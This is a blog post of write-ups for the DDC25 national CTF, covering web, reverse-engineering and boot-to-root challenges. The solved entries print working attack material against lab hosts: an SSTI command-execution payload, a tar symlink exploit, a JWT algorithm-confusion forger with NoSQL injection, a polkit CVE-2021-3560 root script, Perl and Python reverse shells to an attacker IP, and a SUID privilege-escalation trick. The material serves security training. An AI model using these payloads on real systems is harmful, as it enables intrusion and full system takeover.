---
title: 'DDC25 - National Writeups'
description: 'Writeups of all challenges I solved during nationals of DDC25'
pubDate: 'May 8 2025'
heroImage: '/DDC_National25.png'
tags: ['Web', 'DDC', 'B2R']
locked: true
---

The national championship of DDC was held on May 3, 2024, and I ended up placing number 4 in the senior category.
![National Scoreboard](/src/assets/DDC25National/Scoreboard.png) 

# Challenges

## Reverse Engineering
### 1337guesser
###### 100pts - 33 solves
> Kan du slå mit "simple" spil? 👾 Hver gang du gætter forkert, vil der blive genereret et nyt nummer. 🙀

Upon visiting the website we are asked to guess a number:
![1337Guessr home screen](/src/assets/DDC25National/guess.png)

By checking the source of the website we can see that there is some obfuscated Javascript. Deobfuscating this using <https://obf-io.deobfuscate.io/> gives us:
```js
let _0x69d1d3d37 = Math.floor(Math.random() * 0x3e8) * 0x2b;
function README() {
  let _0x32fdb4 = parseInt(document.getElementById('b').value);
  if (_0x32fdb4 === _0x69d1d3d37) {
    fetch('/', {
      'headers': {
        'X-Requested-With': 'XMLHttpRequest'
      }
    }).then(_0x5d750b => _0x5d750b.json()).then(_0x9a506b => {
      document.querySelector('h1').textContent = '::' + _0x9a506b.flag;
    })["catch"](_0x4a46f7 => {
      console.error("broken:", _0x4a46f7);
    });
  } else {
    alert('checking.. flag will not be displayed if false');
  }
  _0x69d1d3d37 = Math.floor(Math.random() * 0x3e8) * 0x2b;
}
document.getElementById('v').addEventListener('click', README);
```

Here we can see that a random number is generated and compared to our input. Knowing this, we can go to the debugger tab of devtools and set a watch expression for ``_0x69d1d3d37``.

We can immediatly see that it has the value we need to guess. In this case it was ``29584``. Simply inputting this gives us the flag:
![1337Guesser flag](/src/assets/DDC25National/guessFlag.png)

And we get our flag:
``DDC{1337_d3crypt0r_g0d}``

### Labyrinth
###### 100pts - 24 solves
> Det ligner ikke at der er anden vej til flaget end at finde igennem labyrinten. Hvis vi farer vild er der ikke andet at gøre end at prøve igen - det hjælper ikke at blive angry

## Forensics
### Unexpected Invoice
###### 100pts - 22 solves
> Vi har fået en invoice fra en eller anden som siger han har lavet en challenge til DDC og skal have nogle penge? Det virker lidt mærkeligt det hele... Kan du tage et kig?

### Bøf-baserede værdipapirer og emails
###### 353pts - 11 solves
> I en yderst vigtig e-mail korrespondance diskuterer JD Vance og Donald Trump forretningsidéer i topklasse, store hemmeligheder og absolut ikke mistænkelige aftaler. Dog har de, enten på grund af manglende cybersikkerhedsprincipper eller en lidt for afslappet tilgang til dem, efterladt et flag i en af deres e-mails.
> 
> Uheldigt for dem (men heldigt for vores Nationals-deltagere) blev en kopi af denne udveksling opsnappet via en ikke-offentliggjort XKEYSCORE-node. En tidligere NSA-medarbejder, der netop var blevet fyret af Elon Musks DOGE-projekt, har lækket et disk-image fra denne XKEYSCORE-node og han så bestemt ikke tilfreds ud.

## Cryptography
### Random AES
###### 100pts - 37 solves
> Jeg vil helst undgå noget fancy, der kan gå galt, så jeg holder mig til CTR-tilstand og et tilfældigt bibliotek til keygen. Hvor mange fejl kan man egentlig lave på bare 10 linjer Python?

### Block Party
###### 100pts - 24 solves
> Vi modtog besked om, at vores fjende planlagde at angribe ved daggry.
> Den krypterede ordre er blevet sendt via deres brugerdefinerede krypteringssystem, der kombinerer mange forskellige AES algoritmer.
> Kan du intercept beskeden og narre dem til at angribe ved skumringstid i stedet?
> Kan du hjælpe os?

## Web Exploitation

### TemplateTrap
###### 116pts - 19 solves
> Tjek her, om dine strenge er palindromer!

When opening the webste we are greeted with the following screen:
![Templatetrap homepage](/src/assets/DDC25National/templatetrap.png)

And we are also given the source:
```js
const express = require("express");
const nunjucks = require("nunjucks");

const app = express();
nunjucks.configure("views", {
  autoescape: true,
  express: app,
});

app.get("/", function (req, res) {
  const input = req.query.value || "";
  if (!input) {
    return res.render("index.html", { message: "Please provide an input" });
  }
  if (input.includes(" ")) {
    return res.render("index.html", { message: "Sorry, we only accept space-free palindromes here!" });
  }
  const reversed = [...input].reverse().join("");
  let message = "";
  if (input && input === reversed) {
    message = nunjucks.renderString((str = reversed + " is a very nice palindrome"));
  } else if (input) {
    message = nunjucks.renderString((str = "You string reversed is not a palindrome: " + reversed));
  }
  
  return res.render("index.html", { message: message });
});

const server = app.listen(process.env.PORT || 80, () => {
  console.log(`Server started on port: ${server.address().port}`);
});
```

Here we can see that it uses nunjucks and reverses our input. The call to ``nunjucks.renderString`` with our input allows us to perform SSTI.

We do however, need to have a payload without any spaces. For this I ended up with the following payload:
```js
{{range.constructor(\"return(global.process.mainModule.require('child_process').execSync('cat${IFS}/flag.txt'))\")()}}
```

In order to properly reverse the output I made a simple js script:
```js
const input = "{{range.constructor(\"return(global.process.mainModule.require('child_process').execSync('cat${IFS}/flag.txt'))\")()}}"
const reversed = [...input].reverse().join("")
console.log(reversed)
```

Which gives:
```js
}})()"))'txt.galf/}SFI{$tac'(cnyScexe.)'ssecorp_dlihc'(eriuqer.eludoMniam.ssecorp.labolg(nruter"(rotcurtsnoc.egnar{{
```

Inputting this on the website gets us the flag:
``DDC{templating-gone-wrong} ``

![Flag screen for template trap](/src/assets/DDC25National/templateFlag.png)

### Photo Album
###### 100pts - 25 solves
> Upload dine billeder!

Upon visiting the page we can see that we are able to upload a ``TAR`` file:
![Photo Album homepage](/src/assets/DDC25National/photoAlbum.png)

By looking into the source we can find the interesting upload function:
```py
@app.route("/", methods=["GET", "POST"])
def upload_file():
    if request.method == "POST":
        if "file" not in request.files:
            return "No file uploaded!", 400

        file = request.files["file"]
        if not allowed_file(file.filename):
            return "📸 Sorry, this isn't a file-sharing site for random files. **JPEGs, PNGs, or TARs with images only!** 🛑", 400

        file_ext = os.path.splitext(file.filename)[1].lower()
        file_path = os.path.join(UPLOAD_FOLDER, file.filename)
        file.save(file_path)

        if file_ext == ".tar":
            if not has_only_images_in_tar(file_path):
                os.remove(file_path)
                return "🤔 Hmmm... This doesn't look like an image. Try again with something *less suspicious*... 👀", 400

            try:
                with tarfile.open(file_path, "r") as tar_ref:
                    tar_ref.extractall(EXTRACT_FOLDER)
                return render_template("success.html")
            except Exception as e:
                return f"Extraction failed: {str(e)}", 500
        else:
            os.rename(file_path, os.path.join(EXTRACT_FOLDER, file.filename))
            return render_template("success.html")
    return render_template("index.html")
```

This allows for us to use the zipslip vulnerability to read the flag. In order to do this we can create a fake image file and symlink it to the flag.
In order to do this I wrote a small script:
```py
import tarfile
import os

# Make a tar with a symlink that looks like an image file
with tarfile.open("exploit.tar", "w") as tar:
    # Create a symlink entry named 'exploit.jpg' pointing to '/flag'
    info = tarfile.TarInfo(name="exploit.jpg")
    info.type = tarfile.SYMTYPE
    info.linkname = "/flag.txt"  # Path to the real flag on server
    tar.addfile(info)
```

After uploading it we can then navigate to <http://photo-album.hkn/static/albums/exploit.jpg> to get the flag. Usually a browser will fail to render the image as it only contains the flag.
Instead we can just send a request in a proxy like Burpsuite and we can see the flag in the response:
![Flag for Photo Album](/src/assets/DDC25National/albumFlag.png)

``DDC{f4k3_im4g3_r34l_fl4g}``

### BugTracker
###### 100pts - 25 solves
> Her er vores bugtracker - hvor vi har helt styr på næsten alle fejl.

This challenge uses JWTs to handle authentication. There is however a small flaw in the validation of these:
```py
def generate_jwt(username, role, algorithm="RS256"):
    payload = {
        "username": username,
        "role": role,
        "exp": datetime.datetime.utcnow() + datetime.timedelta(minutes=30)
    }
    if algorithm == "RS256":
        token = jwt.encode(
            payload,
            SKEY,
            algorithm="RS256"
        )
    elif algorithm == "HS256":
        token = jwt.encode(
            payload,
            SKEY,
            algorithm="HS256"
        )
    else:
        raise ValueError(f"Unsupported algorithm: {algorithm}")
    return token

def decode_jwt(token):
    header = jwt.get_unverified_header(token)
    alg = header.get("alg")

    if alg == "HS256":
        key_obj = serialization.load_pem_public_key(
            KEY,
            backend=default_backend()
        )
        raw_key_bytes = key_obj.public_bytes(
            encoding=serialization.Encoding.DER,
            format=serialization.PublicFormat.SubjectPublicKeyInfo
        )

        return jwt.decode(
            token,
            key=raw_key_bytes,
            algorithms=["HS256"],
            options={"verify_aud": False}
        )
    elif alg == "RS256":
        return jwt.decode(
            token,
            key=KEY,
            algorithms=["RS256"],
            options={"verify_aud": False}
        )
    else:
        raise ValueError(f"Unsupported alg: {alg}")
```

Which allows us to perform a JWT algorithm confusion attack. To start off we need to sign up and login as any user. Then get the JWT token from local storage. After this we can simply paste the token into the solve script below:

```py
import base64
import json
import hmac
import hashlib
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.backends import default_backend

KEY = b"""-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAu312Aqc7m8puqI5i0mm4
+CdBRYRmccFwJme1qHVAc0RcIPSS6k3hJ/WZJgQyDuTt/DUtYb2pbVTzIso3v5HR
FodZ8zZdqHLBF+V8uVluwXGyjw5i7mpBS8PJQMMIL3tEPmYB21KKF1cfkMbDYE6S
r8BchYraXnAtLj+w6w1rzTOEYsqbktCq29xXTWU8+E+mOUYKHS8n8olyPEBfiaHY
fy7nUt+uMrUXxayrTWMi7HduFq4ZW7kUnH66koTo26x+HuhHuh9lhIdVLKmB64Yq
Kyt88r1XOAXI9cMVQZqdRuGbYSg8UgLE1mzqxkAzv0E6hITTJYQdCTAiuUX1Dj1M
bwIDAQAB
-----END PUBLIC KEY-----"""

key_obj = serialization.load_pem_public_key(
            KEY,
            backend=default_backend()
        )
raw_key_bytes = key_obj.public_bytes(
            encoding=serialization.Encoding.DER,
            format=serialization.PublicFormat.SubjectPublicKeyInfo
        )

def jwt_alg_confusion(token, new_payload, public_key):
    public_key = raw_key_bytes
    header, payload, signature = token.split(".")
    header = json.loads(base64.urlsafe_b64decode(header).decode())
    header["alg"] = header["alg"].replace("RS", "HS")
    header = base64.urlsafe_b64encode(json.dumps(header).encode()).strip(b"=")
    
    new_payload = base64.urlsafe_b64encode(json.dumps(new_payload).encode()).strip(b"=")
    new_signature = base64.urlsafe_b64encode(hmac.HMAC(public_key, b'.'.join([header, new_payload]), hashlib.sha256).digest()).strip(b"=")
    
    return b'.'.join([header, new_payload, new_signature]).decode()

def solve():
    public_key = open("public_key.pem").read()
    new_token = jwt_alg_confusion("eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InF1YWNrIiwicm9sZSI6InVzZXIiLCJleHAiOjE3NDY5MDk2ODB9.PFELiAt8HOJl4OJevczHJ7hRyB20XKVlDFoOFGSShgD4rdAycjrq27mmJwwWeKcIcni2Pqyna-y3Cb-7-LC54kWxKNI33epNd6cVI043GKw3iCTr-MLGD4-zrpe_tREDptJrgo2wAhVMmeqNMchB4xu3Sq1QsOY1Wl62nnIlpm8ABDZ8B_4HXxhv1L4q0gWisPG0M2KYXcM24HmGjoUj1R16Tx0uea7XxzB5udQ6ralGAvUX7t9nXKMmEEnYAu9NMUWpDGbKZFToeY90Ww2tBEdnZU5tb7LTXLNDhJ0HeY0Cgcgf14c_0TidGUGaaT47b0CAygZtj9NmWnmPxnqc1g", {
  "username": "admin_user",
  "role": "admin",
  "exp": 1746909680 
}, public_key)
    print(new_token)

if __name__ == "__main__":
    solve()
```

This allows us to sign our forged token using the public key. Therefore we can login as admin:

![Admin page of bug tracker](/src/assets/DDC25National/bugAdmin.png)

On the admin page we can query the database. By just querying anything and going to the proxy/network history we can see a call like ``/admin_search?query=``.
In order to get the flag we can perform NoSQL injection here and extract the flag using the following payload:
``[{"$unionWith": "flags"}]`` that we then need to URL encode to ``/admin_search?query=%5B%7B%22%24unionWith%22%3A%20%22flags%22%7D%5D``

And this gets us the flag: ``DDC{c0nfu53d_4nd_vuln3r4bl3}``
![Flag for bug tracker](/src/assets/DDC25National/bugFlag.png)



### EvilPlot Parking Group
###### 142pts - 17 solves
> YOOOO!
> Der er en date på vej – og jeg har NUL gæsteparkeringer tilbage. Hvis der ikke kan parkeres, er aftenen totalt ødelagt.
> Der må være et hul i det her system. Måske kan du “låne” nabo Bentes mail og rippe hende for gæsteparkeringer...
> Der må være et eller andet sted på siden, hvor vi kan finde en genvej – måske en URL, som de fleste ikke lige tænker over at tjekke? Prøv at kigge alle de steder, der kunne give mening.
> Skynd dig… bilen er lige om hjørnet.

### The Legend
###### 162pts - 16 solves
> Jeg har lavet en mega fed legende generator, gå da lige ind og check den ud og få din helt egen custom legende!!.

### Hestenettet
###### 847pts - 4 solves
> Heyyy - har lavet en ny heste blog 🎉 og tror ikke helt på at nogen kan hacke den. Modsat andre internet fora, finder du ingen source-code leaks her!! Hvis du finder mit password gir jeg et flag (DDC{password}), men har ingen ide om hvordan du nogensinde skulle få det 😆

## Boot2Root
### Sudo But Cooler
###### 353pts - 11 solves
> Besøg pool-kittens.hkn og tag del i dette banebrydende open source projekt!

By navigating to the site we are met with a bunch of pictures of cats. By going to the ``videos`` tab we can find a link to the source code at http://pool-kittens.hkn/source-code.zip.

On the website they mention that they use Git. And sure enough if we run ``git log`` in the directory, we can see all previous commits!

Immediatly an interesting commit message shows up: ``Remove SSH note``.

By doing ``git diff 01df0ab776d8e62ffa0fc138d6e221614be4ea7b`` with the commit ID, we can see the contents of the commit. Here we can find the following:
```markdown
## NOTE to self
Connect to SSH: admin:cutecatz1337
```

Now we can login on the server using:
``ssh admin@pool-kittens.hkn`` with the password ``cutecatz1337``.

Now that we are on the system, we can look around. By opening ``.bash_history`` we get a hint of how to escalate:
```
pkexec --version
apt list --installed | grep policykit-1
```

By running both of these commands we can get some very useful information. Turns out we are running ``pkexec version 0.105`` and ``policykit-1/focal,now 0.105-26``.
By simply googling the policykit version we can quickly find this exploit <https://www.exploit-db.com/exploits/50011> for the CVE-2021-3560.

We will however need to modify it a bit, as ``bc`` is not on the remote machine. This is used to calculate the correct halftime. Instead we can just run:
```
time dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser string:$userName string:$realName int32:$accountType 
```

And divide that number by two. In this case the result is:
```
real    0m0.006s
user    0m0.002s
sys     0m0.000s
```

Here we take the "real" time and divide it in 2. We therefore get ``0.003``. It might still need some tweaking to work. In this case ``0.002`` ended up working. Therefore we end up with the script:
```bash
#!/bin/bash

# Set the name and display name
userName="hacked"
realName="hacked"

# Set the account as an administrator
accountType=1 

# Set the password hash for 'password' and password hint
password='$5$WR3c6uwMGQZ/JEZw$OlBVzagNJswkWrKRSuoh/VCrZv183QpZL7sAeskcoTB'
passHint="password"

# Check Polkit version
polkitVersion=$(systemctl status polkit.service | grep version | cut -d " " -f 9)
if [[ "$(apt list --installed 2>/dev/null | grep polkit | grep -c 0.105-26)" -ge 1 || "$(yum list installed | grep polkit | grep -c 0.117-2)" ]]; then
    echo "[*] Vulnerable version of polkit found"
else
    echo "[!] WARNING: Version of polkit might not vulnerable"
fi

# Validate user is running in SSH instead of desktop terminal
if [[ -z $SSH_CLIENT || -z $SSH_TTY ]]; then
    echo "[!] WARNING: SSH into localhost first before running this script in order to avoid authentication prompts"
    exit
fi

# Test the dbus-send timing to load into exploit
echo "[*] Determining dbus-send timing"
realTime=$( TIMEFORMAT="%R"; { time dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser string:$userName string:$realName int32:$accountType ; } 2>&1 | cut -d " " -f6 )
halfTime=$(echo "0.002s")

# Check for user first in case previous run of script failed on password set
if id "$userName" &>/dev/null; then
    userid=$(id -u $userName)
    echo "[*] New user $userName already exists with uid of $userid"
else
    userid=""
	echo "[*] Attempting to create account"
    while [[ $userid == "" ]]
    do
        dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser string:$userName string:$realName int32:$accountType 2>/dev/null & sleep $halfTime ; kill $! 2>/dev/null
        if id "$userName" &>/dev/null; then
	    userid=$(id -u $userName)
            echo "[*] New user $userName created with uid of $userid"
        fi
    done
fi

# Add the password to /etc/shadow
# Sleep added to ensure there is enough of a delay between timestamp checks
echo "[*] Adding password to /etc/shadow and enabling user"
sleep 1
currentTimestamp=$(stat -c %Z /etc/shadow)
fileChanged="n"
while [ $fileChanged == "n" ]
do 
    dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts/User$userid org.freedesktop.Accounts.User.SetPassword string:$password string:$passHint 2>/dev/null & sleep $halfTime ; kill $! 2>/dev/null
	if [ $(stat -c %Z /etc/shadow) -ne $currentTimestamp ];then
	    fileChanged="y"
	    echo "[*] Exploit complete!"
	fi
done

echo ""
echo "[*] Run 'su - $userName', followed by 'sudo su' to gain root access"
```

If the script worked, we should get output similar to this:
```
System has not been booted with systemd as init system (PID 1). Can't operate.
Failed to connect to bus: Host is down
[*] Vulnerable version of polkit found
[*] Determining dbus-send timing
[*] Attempting to create account
[*] New user hacked created with uid of 1001
[*] Adding password to /etc/shadow and enabling user
[*] Exploit complete!

[*] Run 'su - hacked', followed by 'sudo su' to gain root access
```

It might take a few tries and tweaking with the half time variable.
Now we can run ``su - hacked`` with the password ``password``. Then we can run ``sudo su`` to become root.

After that we can simply cat the flag: ``cat /home/admin/flag.txt`` and we get our flag!

``DDC{c0ngr4tz-0n-byp4ss1ng-the-c4tz}``

### Kattekillingen
###### 116pts - 19 solves
> Jeg har lavet en hjemmeside hvor man kan prøve sine bash skills af. Jeg har lavet lidt sikkerhed på den, så du kan ikke bare få mine dybeste hemligheder i root mappen, men du skal være velkommen til at prøve min hjemmeside. Ps: hvis du nogensinde får adgang til systemet så skal man være super user.

By quickly running ``nmap`` we discover that there is a port ``8080`` is open.

Here we can see that we can execute a bash command of our choice.
![Kattekilling homepage](/src/assets/DDC25National/kattekilling.png)

By running a couple of commands it turns out there is a blacklist blocking certain commands. To avoid this we can spawn a reverse shell using ``Perl``:
```bash
perl -e 'use Socket;$i="10.0.240.253";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("bash -i");};'
```

Once we are on the system we can simply just run ``su root`` with the password ``root``.

By opening ``/root/flag.txt`` we get our flag:
``DDC{seems_like_I_forgot_something}``

### Op i Gear
###### 484pts - 9 solves
> DET ER NATIONALS OG DET ER TID TIL AT KOMME 100% OP I GEAR MIN VEN, FANG MIG PÅ op-i-gear.hkn

By navigating to the web server, we are able to choose different "gears" that display a different page depending on which gear you have chosen.
![Op i Gear homepage](/src/assets/DDC25National/opigear.png)

If we look in the given source we can find the relevant function:
```php
// Process when gear is selected
if (isset($_GET['gear'])) {
    $gear = $_GET['gear'];

    // Just check if the command isn't too long for security you know
    if (strlen($gear) <= 30) {

        // Create command to cat the selected gear file
        $command = "cat gears/" . $gear . ".txt";

        // Execute the command
        $output = shell_exec($command . " 2>&1");

        // Set the current gear for image display
        $current_gear = $gear;
    } else {
        $current_gear = "gear-1";
        $output = "Fejl: Gear navn må højst være 30 tegn";
    }
}
?>
```

It turns out that we are actually running a shell command when we choose a "gear". The full command would look like this:
```bash
cat gears/gear-4.txt
```

This allows us to perform command injection. But we are also limited by the 30 char limit. We can exploit this by writing a reverse shell in small chunks:
```python
f';echo -n \"{content}\">>{file}'
```

If we choose a filename with one character, it will automatically append ``.txt``, so we don't need to worry about the file extension. This allows us to write 6 characters at a time. For convenience I wrote a script to do it:
```py
import requests

url = "http://op-i-gear.hkn/?gear="

def send_file(content, file):
    payload = f";echo -n \"{content}\">>{file}"
    req = requests.get(url + payload)
    print(f"File {file} with {content}")
    print(req.status_code)

exploit = "import os,pty,socket;s=socket.socket();s.connect(('10.0.240.253',4444));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn('/bin/sh')"

file_name = "t"

chunks = [exploit[i:i+6] for i in range(0, len(exploit), 6)]

for chunk in chunks:
    send_file(chunk, file_name)

print(f"Finished sending {exploit} to {file_name}")
```

This writes a python reverse shell into the file ``t.txt``. We can then execute it to get a reverse shell with ``; python3 t`` (note that the extension will automatically be appended).

By executing this we will have a shell as ``www-data``. For the privesc we have a few hints from the Dockerfile given:
```dockerfile
<...SNIP...>
# Set up scripts directory
RUN mkdir -p /opt/scripts/ && chmod 755 /opt/scripts/ && chown root:root /opt/scripts/
COPY osinfo.py /opt/scripts/osinfo.py
RUN chmod 755 /opt/scripts/osinfo.py

# Set environment variables
RUN echo "PYTHONUSERBASE=/tmp" >> /etc/environment

# Set up cron job
RUN printf "* * * * * root /usr/bin/python3 /opt/scripts/osinfo.py\n" > /etc/cron.d/python-cron && chmod 0644 /etc/cron.d/python-cron

# Create the flag file
RUN FILENAME=$(openssl rand -hex 12).txt && echo "DDC{eksempel}" > /root/$FILENAME
<...SNIP...>
```

Here we can see that the file ``osinfo.py`` is running as a cronjob with root permissions every minute. The file can be seen here:
```py
#!/usr/bin/python3

import datetime
import platform
import random

DEBUG_FILE = "/tmp/osinfo.txt"

def write_debug_info():
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    random_debug_info = {
        "OS": platform.system(),
        "Release": platform.release(),
        "OS Version": platform.version(),
        "Machine": platform.machine(),
        "Processor": platform.processor(),
        "Random Number": random.randint(1, 100)
    }
    
    with open(DEBUG_FILE, "w") as file:
        file.write(f"Timestamp: {timestamp}\n")
        for key, value in random_debug_info.items():
            file.write(f"{key}: {value}\n")

if __name__ == "__main__":
    write_debug_info()
```

A very important thing to notice from the Dockerfile is the following line:
```dockerfile
RUN echo "PYTHONUSERBASE=/tmp" >> /etc/environment
```

As this allows us write files to the python environment. To utilize this, we can create the following folder structure:
``/tmp/lib/python3.10/site-packages/``.

This allows us to write a "malicious" file into ``sitecustomize.py`` that allows us to become root.

By reading the Python docs, we can learn that ``sitecustomize.py`` is always imported when running python. Therefore we can write our payload to that file:
```bash
printf 'import os\nos.system("chmod u+s /bin/bash")\n' > /tmp/lib/python3.10/site-packages/usercustomize.py
```

After this we just need to wait for the cronjob to run. This sets the SUID on ``bash`` so we can just use ``bash -p`` to spawn a root shell. 

To check wether or not the payload has worked we can run ``ls -la /bin/bash`` and look for the SUID bit. It will show the SUID (s) bit like this when the payload has worked:
```bash
-rwsr-xr-x 1 root root 1396520 Mar 14  2024 /bin/bash
```
Now we just run ``bash -p`` and we have a root shell and we can get our flag!

``DDC{n1ce_pr1v3sc_nu_du_R00000000oo0o0o0o00000t}``


## Misc
### Empowering DevOps Security 2
###### 709pts - 6 solves
> Velkommen til Empowering DevOps Security (EDS)-teamet! Vi er spændte på at starte vores samarbejde! Ulduar er vores nyeste Flask-app-projekt. Kig gerne rundt i Ulduar, men lad være med at røre ved noget, da en af vores andre udviklere er lidt følsom overfor dette projekt. Vi mener, at de fleste Python-images er lidt for store, så vi arbejder på at udvikle vores eget, som skal bruges i vores Ulduar-projekt. Vi vil sætte pris på, hvis du kan hjælpe med at færdiggøre det i Icecrown.
> 
> Vi har oprettet en ny bruger til dig:<br>
> Brugernavn: Alice<br>
> Adgangskode: password

